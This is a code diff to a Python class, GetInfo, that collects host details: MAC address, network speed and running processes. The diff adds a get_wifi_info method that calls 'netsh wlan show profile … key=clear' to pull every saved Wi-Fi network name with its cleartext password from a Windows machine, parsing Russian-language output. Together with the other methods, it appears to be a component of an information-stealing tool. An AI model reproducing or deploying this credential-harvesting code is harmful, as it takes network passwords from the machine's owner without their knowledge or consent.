@@ -5,7 +5,7 @@ import getpass
 from datetime import datetime
 from uuid import getnode as get_mac
 from speedtest import Speedtest
-from subprocess import Popen, PIPE
+from subprocess import Popen, PIPE, check_output
 
 
 class GetInfo:
@@ -55,3 +55,20 @@ class GetInfo:
     @staticmethod
     def get_process() -> str:
         return ' '.join([line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()])
+
+    @staticmethod
+    # todo for ru and en version
+    def get_wifi_info() -> str:
+        passwords = []
+        data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
+        wifi_list = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
+        for wifi in wifi_list:
+            results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode(
+                'cp866').split(
+                '\n')
+            results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
+            try:
+                passwords.append(f'Имя сети: {wifi}, Пароль: {results[0]}')
+            except IndexError:
+                passwords.append(f'Имя сети: {wifi}, Пароль не найден!')
+        return "\n".join(passwords)
